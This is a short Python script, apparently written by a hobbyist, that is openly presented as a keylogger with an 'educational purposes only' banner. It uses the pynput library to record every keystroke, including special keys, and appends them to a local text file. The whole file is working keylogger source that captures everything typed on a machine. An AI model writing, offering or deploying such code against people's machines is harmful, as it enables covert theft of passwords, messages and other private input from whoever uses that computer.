#THIS IS ONLY MADE FOR EDUCATIONAL PURPOSES ONLY!!!!!
#This is my python keylogger 

#Importing the propper libary in order to make the program run
from pynput.keyboard import Key, Listener


def logging(key):
    try: #This will log your normal alphanuemeric keys
        with open("KeyLogging.txt", "a") as file:
            file.write(f"{key.char}")

    except AttributeError: #This logs special charaters seperatly
        
        with open("KeyLogging.txt", "a") as file:
            file.write(f" [{key}] ")

with Listener(on_press=logging) as listener:
    listener.join() #This keeps the program running and captures keystrokes continuously
